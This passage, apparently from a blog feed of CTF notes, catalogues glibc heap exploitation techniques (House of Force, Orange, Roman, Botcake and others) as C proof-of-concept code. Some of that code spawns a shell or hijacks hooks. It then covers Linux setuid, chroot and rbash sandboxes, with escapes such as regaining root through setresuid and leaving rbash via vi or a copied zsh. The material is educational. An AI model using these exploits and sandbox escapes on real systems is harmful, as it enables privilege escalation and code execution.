href="https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a><br><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">https://blog.csdn.net/m0_38100569/article/details/100673103</a><br><a href="http://eternalsakura13.com/2018/03/31/b_core/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/31/b_core/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of All in One</title>
    <link href="/2020/04/25/%5BTODO%5DHouse-of-All-in-One/"/>
    <url>/2020/04/25/%5BTODO%5DHouse-of-All-in-One/</url>
    
    <content type="html"><![CDATA[<p><code>House-of-*</code> 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做<a href="https://en.wikipedia.org/wiki/Malleus_Maleficarum" target="_blank" rel="noopener">女巫之槌</a>）的文章。</p><a id="more"></a><h1 id="Malleus-Maleficarum"><a href="#Malleus-Maleficarum" class="headerlink" title="Malleus Maleficarum"></a><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener">Malleus Maleficarum</a></h1><h2 id="House-of-Prime-glibc-2-3-5"><a href="#House-of-Prime-glibc-2-3-5" class="headerlink" title="House of Prime (glibc-2.3.5)"></a>House of Prime (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/" target="_blank" rel="noopener">X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE</a>)</p><pre><code class="cpp">void_int_free(mstate av, Void_t* mem){    mchunkptr       p;           /* chunk corresponding to mem */    INTERNAL_SIZE_T size;        /* its size */    mfastbinptr*    fb;          /* associated fastbin */    ...    p = mem2chunk(mem);    size = chunksize(p);    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)        || __builtin_expect ((uintptr_t) p &amp; MALLOC_ALIGN_MASK, 0))    {        errstr = &quot;free(): invalid pointer&quot;;      errout:        malloc_printerr (check_action, errstr, mem);        return;    }</code></pre><h2 id="House-of-Mind-glibc-2-3-5"><a href="#House-of-Mind-glibc-2-3-5" class="headerlink" title="House of Mind (glibc-2.3.5)"></a>House of Mind (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…</a>)</p><pre><code class="cpp">public_fREe(Void_t* mem){  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;  if (hook != NULL) {    (*hook)(mem, RETURN_ADDRESS (0));    return;  }  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk(mem);#if HAVE_MMAP  if (chunk_is_mmapped(p))                       /* release mmapped memory. */  {    munmap_chunk(p);    return;  }#endif  ar_ptr = arena_for_chunk(p);#if THREAD_STATS  if(!mutex_trylock(&amp;ar_ptr-&gt;mutex))    ++(ar_ptr-&gt;stat_lock_direct);  else {    (void)mutex_lock(&amp;ar_ptr-&gt;mutex);    ++(ar_ptr-&gt;stat_lock_wait);  }#else  (void)mutex_lock(&amp;ar_ptr-&gt;mutex);#endif  _int_free(ar_ptr, mem);  (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);}</code></pre><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Modify top chunk to control buffer.</p><p>(<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset1 0x601080 - 0x10 - 0x602020 - 0x10#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10char buf1[50] = &quot;Original Buffer (bss).&quot;;int main() {    void *p, *q;    char buf2[50] = &quot;Original Buffer (stack).&quot;;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset1);    q = malloc(0x48);    puts(buf1);    memset(q, &#39;X&#39;, strlen(buf1));    puts(buf1);    /*    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff    malloc(offset2);    q = malloc(0x48);    puts(buf2);    memset(q, &#39;Y&#39;, strlen(buf2));    puts(buf2);    */    exit(0);}</code></pre><h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void sh() {    system(&quot;/bin/sh&quot;);    exit(0);}int main() {    void *p, *q, *r, *s, *t;    char buf1[0x20], buf2[0x20];    fprintf(stderr, &quot;buf1 =&gt; %p\n&quot;, buf1);    fprintf(stderr, &quot;buf2 =&gt; %p\n&quot;, buf2);    p = malloc(0x68);    fprintf(stderr, &quot;p = malloc(0x68) =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1&#39;s fd = p - 0x10    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1&#39;s bk = buf2    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2&#39;s fd = buf1    q = malloc(0x408);    fprintf(stderr, &quot;q = malloc(0x408) =&gt; %p\n&quot;, q);    free(p);    r = malloc(0x508);    fprintf(stderr, &quot;r = malloc(0x508) =&gt; %p\n&quot;, r); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p&#39;s bk = buf1    s = malloc(0x68);    fprintf(stderr, &quot;s = malloc(0x68) =&gt; %p\n&quot;, s); // Get p (The original Freed Chunk)    t = malloc(0x68);    fprintf(stderr, &quot;t = malloc(0x68) =&gt; %p\n&quot;, t); // Allacte to Stack    uint64_t sh_addr = (uint64_t)sh;    memcpy(t + 0x48, &amp;sh_addr, 8);}</code></pre><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>Free a fake chunk into fastbin. (Stack overflow)</p><p>(<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;char target[0x100];int main() {    void *p, *mem;    fprintf(stderr, &quot;Target =&gt; %p\n&quot;, target);    p = malloc(0x58);    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk&#39;s mem    fprintf(stderr, &quot;fake chunk&#39;s mem =&gt; %p\n&quot;, mem);    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk&#39;s size = 0x61    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk&#39;s next chunk&#39;s size = 0x41    free(p);    free(mem);    fprintf(stderr, &quot;malloc(0x58) =&gt; %p\n&quot;, malloc(0x58));    exit(0);}</code></pre><h2 id="House-of-Chaos"><a href="#House-of-Chaos" class="headerlink" title="House of Chaos"></a>House of Chaos</h2><pre><code>(&amp;*^^&amp;%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&amp;*%^$&amp;%%^^&amp;#!@^&amp;_)^&amp;...</code></pre><h1 id="Later-House"><a href="#Later-House" class="headerlink" title="Later House"></a>Later House</h1><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a><a href="https://www.youtube.com/watch?v=tq3mPjsl-H0" target="_blank" rel="noopener">House of Einherjar</a></h2><p>Mostly chunk overlapping. (Unlink, Off by One)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;int main() {    char *p, *q, *r, *s;    p = malloc(0x208);    q = malloc(0x18);    r = malloc(0xf8);    s = malloc(0x18);    printf(&quot;Fake chunk =&gt; %p\n&quot;, p);    *(uint64_t *)((uint64_t)p) = 0;    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk&#39;s size    // Bypass unlink    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk&#39;s fd    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk&#39;s bk    printf(&quot;Off by One\n&quot;);    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size    *(uint8_t *)((uint64_t)q + 0x18) = &#39;\x00&#39;; // Off by One    free(r); // unlink    printf(&quot;malloc(0x310) =&gt; %p\n&quot;, malloc(0x318));    return 0;}</code></pre><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">House of Orange</a></h2><p>Create a freed chunk without <code>free()</code> and attack with <code>_IO_FILE</code> structure. (Unsortedbin Attack)</p><pre><code class="cpp">// glibc-2.23 version#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define _IO_list_all 0x3c5520#define one_gadget 0xf1147char fake_vtable[0xa8];int main() {    void *p;    void *fake_file;    p = malloc(0x18);    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk&#39;s size = 0xfe1    malloc(0x1000); // Trigger sysmalloc (free top chunk)    p = malloc(0x500); // Get a unsortedbin-chunk    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;    fprintf(stderr, &quot;leak libc =&gt; %p\n&quot;, libc_base);    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;    fake_file = unsorted_bin_chunk_addr;    uint64_t IO_list_all_addr = libc_base + _IO_list_all;    // Create fake file (also a fake smallbin)    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin&#39;s size ; Fake _chain @ `&amp;unsortedbin + 0x68`    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack    // Bypass _IO_overflow_t    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable    uint64_t one_gadget_addr = libc_base + one_gadget;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow    malloc(1); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a><a href="https://github.com/shift-crops/House_of_Rabbit" target="_blank" rel="noopener">House of Rabbit</a></h2><p>TODO</p><p>(recommend <a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">P4nda’s article</a>)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x50] = &quot;Orignial Buffer.&quot;;char buf[0x40];int main() {    void *p, *q;    fprintf(stderr, &quot;Target: %s\n&quot;, target);    p = malloc(0xa00008);    free(p);    p = malloc(0xa00008);    free(p);    p = malloc(0x28);    q = malloc(0x88);    free(p);    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1&#39;s size = 0x11    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2&#39;s prev_size = 0xfffffffffffffff1    *(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk&#39;s fd = Fake Chunk2    free(q); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk    malloc(0xa00000);    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk    int offset = (uint64_t)&amp;target - ((uint64_t)buf + 0x10) - 0x20;    p = malloc(offset);    fprintf(stderr, &quot;p = malloc(offset) =&gt; %p\n&quot;, p);    void *victim = malloc(0x18);    strcpy(victim, &quot;Hacked.&quot;);    fprintf(stderr, &quot;Target: %s\n&quot;, target);    exit(0);}</code></pre><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">House of Roman</a></h2><p>Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a0d000#define __malloc_hook libc_base+0x3c4b10#define one_gadget libc_base+0xf02a4int main() {    void *p, *q, *r, *s, *u, *v;    p = malloc(0x18);    q = malloc(0xc8);    r = malloc(0x68);    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;    free(q);    q = malloc(0xc8); // Get Unsortedbin addr    s = malloc(0x68);    u = malloc(0x68); // For fixing Fastbin    v = malloc(0x68); // For triggering malloc_printerr    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One    free(r);    free(s);    *(uint8_t *)((uint64_t)s) = 0x20; // Point s&#39;s fd to q    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) &amp; 0xffff; // Point q&#39;s fd to `&amp;__malloc_hook - 0x23`    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    p = malloc(0x68); // Get the chunk @ `&amp;__malloc_hook - 0x23`    free(u);    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin&#39;s fd = 0 to fix Fastbin    q = malloc(0xc8);    fprintf(stderr, &quot;malloc(0x18) =&gt; %p\n&quot;, malloc(0x18));    free(q);    // Unsortedbin Attack    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) &amp; 0xffff; // Point q&#39;s bk to `&amp;__malloc_hook - 0x10`    fprintf(stderr, &quot;malloc(0xc8) =&gt; %p\n&quot;, malloc(0xc8));    // Partial Write one_gadget    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget &amp; 0xffff;    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget &gt;&gt; 16) &amp; 0xff;    free(v);    free(v); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Botcake-gt-glibc-2-26"><a href="#House-of-Botcake-gt-glibc-2-26" class="headerlink" title="House of Botcake (&gt;= glibc-2.26)"></a><a href="https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">House of Botcake</a> (&gt;= glibc-2.26)</h2><p>Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void *ptr[7];char buf[0x20];int main() {    void *p;    fprintf(stderr, &quot;target =&gt; %p\n&quot;, buf);    for (int i = 0; i &lt; 7; i++) { // Fillup Tcache        ptr[i] = malloc(0x108);    }    p = malloc(0x108);    void *victim = malloc(0x108);    malloc(0x18); // padding    for (int i = 0; i &lt; 7; i++) {        free(ptr[i]);    }    free(victim); // Add to unsortedbin    free(p); // Consolidate with victim    malloc(0x108); // get a chunk from Tcache &amp; put victim into Tcache    free(victim); // Double free    p = malloc(0x128);    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim&#39;s fd = buf    malloc(0x108);    p = malloc(0x108);    fprintf(stderr, &quot;p = malloc(0x108) =&gt; %p\n&quot;, p);    exit(0);}</code></pre><h2 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a><a href="https://github.com/CptGibbon/House-of-Corrosion" target="_blank" rel="noopener">House of Corrosion</a></h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=dooN6X28daI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dooN6X28daI</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a><br><a href="https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/" target="_blank" rel="noopener">https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Sandbox - Setuid</title>
    <link href="/2020/04/23/Linux-Sandbox-Setuid/"/>
    <url>/2020/04/23/Linux-Sandbox-Setuid/</url>
    
    <content type="html"><![CDATA[<p>Yet Another Linux Sandbox Technic.</p><a id="more"></a><h1 id="Combination-Blow"><a href="#Combination-Blow" class="headerlink" title="Combination Blow"></a>Combination Blow</h1><p>Setuid Sandbox 主要是基于 Linux Kernel 所提供的安全机制（如 DAC）来实现。简单地说就是利用 <code>random uid/gid + chroot() + capability</code> 的组合出击来达到目标。其实现非常简单，无需修改 Kernel。Setuid Sandbox 的实现简单易行。在一定程度上，它可以用于隔离不可信的程序。由于它完全依赖于 kernel 所提供的安全机制，除非攻击者能找到 kernel 的 0-day 漏洞并通过攻击获得 root 权限，否则 Setuid Sandbox 所提供的安全隔离是可以保证的。</p><h2 id="What-is-setuid"><a href="#What-is-setuid" class="headerlink" title="What is setuid"></a>What is setuid</h2><p>Linux 中每个进程都会有一个 uid，<code>uid = 0</code> 则为 root 用户进程（privileged），<code>uid &gt; 0</code>则为普通用户进程（unprivileged）。不同 uid 进程之间（不包括 root 进程）是相互隔离的，各自都有自己独立的权限，互不干扰。而 root 进程具有特权，它能干任何事情。Linux uid/gid 机制主要是用于进程的权限隔离。如果你打算执行不可信的程序，那么你可以在启动该程序时为其分配一个 random uid，大概的执行流程如下：<code>fork() -&gt; setuid() -&gt; {设置相关的进程资源限制，如 RLIMIT_NPROC (0,0)} -&gt; execve()</code>。而 <code>setuid()</code> 只能由 root 权限（或拥有 <code>CAP_SETUID</code> Capability）才能成功调用，所以要顺利执行这个流程需要借助某个拥有 root 权限的进程。</p><p>Linux 下为进程设置了三个 UID：</p><ul><li>Real UID（RUID）：进程创建者的 UID，正常情况下它一直不会变化，永远表示进程创建者，但 root 用户可以更改它；</li><li>Saved UID（SUID）：拥有者可以为自己的可执行程序设置 SUID 位，设置后任何人执行程序，程序启动时都将获得程序拥有者的权限；</li><li>Effective UID（EUID）：为权限检查时实际生效的 UID，意味着在判断用户权限时并不检查 RUID 及 SUID，只看 EUID。</li></ul><p>用 <code>getresuid</code> 来获取当前用户的三个 UID：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    if (getresuid(&amp;ruid, &amp;euid, &amp;suid) == 0) {        printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    } else {        ;    }    return 0;}</code></pre><p>如果为文件加上 SUID 标志位，其他用户运行该文件时会获得 root 的权限。但 RUID 保持不变：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ sudo -u root ./test-uidRUID: 0    EUID: 0    SUID: 0root in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 33    SUID: 33root in ~/Setuid-Sandbox λ chmod u+s ./test-uidroot in ~/Setuid-Sandbox λ ls -l ./test-uid-rwsr-xr-x 1 root root 8720 Apr 24 19:11 ./test-uidroot in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 0    SUID: 0</code></pre><h2 id="What-is-chroot"><a href="#What-is-chroot" class="headerlink" title="What is chroot"></a>What is chroot</h2><p>通常来说，提到 Chroot 一般有两个含义，<code>chroot(1)</code> 是 <code>/usr/bin/chroot</code>，<code>chroot(2)</code> 是 glibc 中的一个函数。Chroot 是 Linux Kernel 提供的另一个安全功能，它用于改变进程的根目录。比如运行 <code>chroot(&quot;/tmp/sandbox/1/&quot;)</code>，会启动一个新的 Shell 并设置新进程的根目录为 <code>&quot;/tmp/sandbox/1/&quot;</code>，那么该进程的文件操作将被限制在 <code>&quot;/tmp/sandbox/1/&quot;</code> 中。注意，<code>chroot()</code> 只能由 root 权限（或拥有 <code>CAP_SYS_CHROOT</code> Capability）才能成功调用。</p><h3 id="Chroot-Command"><a href="#Chroot-Command" class="headerlink" title="Chroot Command"></a>Chroot Command</h3><p>需要静态编译 Busybox 和 Bash：</p><pre><code class="bash">$ wget$ tar -zxvf$ cd  &amp;&amp; mkdir build$ make O=build defconfig$ cd build &amp;&amp; make menuconfig # Select &quot;Build BusyBox as a static binary (no shared libs)&quot;$ make$ wget http://ftp.gnu.org/gnu/bash/bash-5.0-beta.tar.gz$ tar -zxvf bash-5.0-beta.tar.gz$ cd bash-5.0-beta &amp;&amp; ./configure --enable-static-link --without-bash-malloc$ make</code></pre><p>使用 chroot 来修改当前的根目录，可以看到 ls 的结果是不同的：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ ./bashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# ./busybox ls /bin             etc             initrd.img.old  lost+found      opt             run             sys             varboot            home            lib             media           proc            sbin            tmp             vmlinuzdev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.oldroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# exitexitroot in ~/Setuid-Sandbox λ chroot . ./bashbash-5.0# ./busybox ls /bash      busybox   chroot    chroot.c  lsbash-5.0# exitexit</code></pre><h3 id="Chroot-Function"><a href="#Chroot-Function" class="headerlink" title="Chroot Function"></a>Chroot Function</h3><p>进程中有 <code>cwd</code>（当前目录）和 <code>root</code>（根目录）两个目录。C 库中提供了几个函数对两者进行修改：</p><pre><code class="cpp">int chdir(const char *path);     //依据目录名改cwdint fchdir(int fd);              //依据文件描述符改cwdint chroot(const char *path);    //依据目录名改root</code></pre><pre><code class="cpp">#include &lt;unistd.h&gt;int main() {    chroot(&quot;.&quot;);    chdir(&quot;/&quot;);    char *argv[] = {&quot;./bash&quot;, NULL};    execl(argv[0], argv, NULL);    return 0;}</code></pre><h3 id="Create-bash-jail"><a href="#Create-bash-jail" class="headerlink" title="Create bash jail"></a>Create bash jail</h3><p>可以使用 <a href="https://olivier.sessink.nl/jailkit/index.html" target="_blank" rel="noopener">jailkit</a> 创建一个安全的 jail 环境：</p><pre><code class="bash">$ wget https://olivier.sessink.nl/jailkit/jailkit-2.20.tar.gz$ tar -zxvf jailkit-2.20.tar.gz$ cd jailkit-2.20 &amp;&amp; ./configure$ make$ make install</code></pre><h3 id="Combine-with-setuid"><a href="#Combine-with-setuid" class="headerlink" title="Combine with setuid"></a>Combine with setuid</h3><p>那么在前面叙述的执行流程中，可以先让具有 root 权限的进程去执行 <code>chroot()</code> 后再调用 <code>setuid() -&gt; {...} -&gt; execve()</code>。但其实这样做是行不通的，因为进程的根目录已经被修改，<code>execve()</code> 本要执行的 Binary 文件已经不可用了。Google 的一篇文章里给出了一个解决此问题的简单方法：</p><ol><li>创建一个子进程，注意使用 <code>clone()</code> 和 <code>CLONE_FS</code>，使得父子进程可以共享根目录、当前目录等等；</li><li>父进程降权后执行 <code>execve()</code>，又产生一个新进程；</li><li>然后父进程请求子进程执行 <code>chroot()</code>；</li><li>子进程执行 <code>chroot()</code>，新的根目录会对两个子进程同时生效。</li><li>父进程退出。</li></ol><p>这个方法的前提是 父进程 需要设置 <code>RLIMIT_NOFILE</code> 为 <code>(0, 0)</code>，并且对于不可信的子进程（<code>execve</code> 创建的新进程）来说，在执行第 4 步之前应是可控的。另外，对于父进程来说，由于它是以 root 身份运行，那么就可能会成为攻击点，比如 Confused Deputy Problem。</p><h2 id="Capability-Mechanism"><a href="#Capability-Mechanism" class="headerlink" title="Capability Mechanism"></a>Capability Mechanism</h2><p>Linux Capability 主要是解决 Confused Deputy Problem（如 CSRF）。Linux 支持 Capability 的主要目的是细化 root 的特权。比如拿 ping 来说，它需要使用 raw_sockets 所以需要 root 特权才能运行；如果有了 Capability 机制，由于该程序只需要一个 <code>CAP_NET_RAW</code> 的 Capability 即可运行，那么根据最小权限原则，该程序运行时可以丢弃所有多余的 Capability，以防止被误用或被攻击。所以，Capability 机制可以将 root 特权进行很好的细分。Kernel-2.6.18 起已支持 30 多种不同的 Capability，在 Kernel-2.6.24 及以上的版本中一个普通用户进程也将可以持有 Capability。</p><h2 id="What-is-rbash（Restricted-Bash）"><a href="#What-is-rbash（Restricted-Bash）" class="headerlink" title="What is rbash（Restricted Bash）"></a>What is rbash（Restricted Bash）</h2><p><code>rbash</code> 的主要作用是限制了部分 Bash 命令，会以一种受限的方式启动 Bash：</p><ol><li>只能执行当前目录下的可执行文件；</li><li>在执行命令时命令不能带 <code>/</code>；</li><li>不能改变当前工作目录；</li><li>不能更改 <code>PATH</code> 或 <code>SHELL</code> 变量；</li><li>不能使用重定向输出；</li><li>…</li></ol><pre><code class="bash">root@5b0ef65c6894:~# rbashroot@5b0ef65c6894:~# cd tmp/rbash: cd: restrictedroot@5b0ef65c6894:~# ./tmp/rp-lin-x64rbash: ./tmp/rp-lin-x64: restricted: cannot specify `/&#39; in command namesroot@5b0ef65c6894:~# export PATH=$PATH:/root/tmprbash: PATH: readonly variable</code></pre><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="Bypass-setuid"><a href="#Bypass-setuid" class="headerlink" title="Bypass setuid"></a>Bypass setuid</h2><p>当程序执行完高权限后使用 <code>setresuid</code> 进行降权操作，但是并未完全抹除高权限：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    seteuid(2333); // Modify EUID    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 2, -1); // unprivileged    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 0, -1); // Get root privilege    setresuid(123, 123, 123);    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    return 0;}</code></pre><h2 id="Bypass-chroot"><a href="#Bypass-chroot" class="headerlink" title="Bypass chroot"></a>Bypass chroot</h2><p>Chroot 沙箱可以将进程对文件的访问限制在一个指定的目录中，但是由于 Chroot 不是一个安全的 feature，所以该沙箱可能会被逃逸出来。比如使用 <a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener"><code>chw00t</code></a>。当进程中存在文件在当前 root 目录树外，即在 jail 外，即表明越狱成功，此时的 root 就是原来文件系统的 root 了。</p><h2 id="Bypass-rbash"><a href="#Bypass-rbash" class="headerlink" title="Bypass rbash"></a>Bypass rbash</h2><p>rbash 的绕过方法也有很多，通常跟 chroot 配合使用。不过它本身对文件操作是没有限制的。可以使用 vi、vim 等命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# vi# :set shell=/usr/bin/zsh# :shellroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls</code></pre><p>可以使用 cp、mv 等文件操作命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# cp /usr/bin/zsh .root@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# lsbash  busybox  chroot  chroot.c  ls  zshroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# zshroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls  zsh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.linuxidc.com/Linux/2015-02/112914.htm" target="_blank" 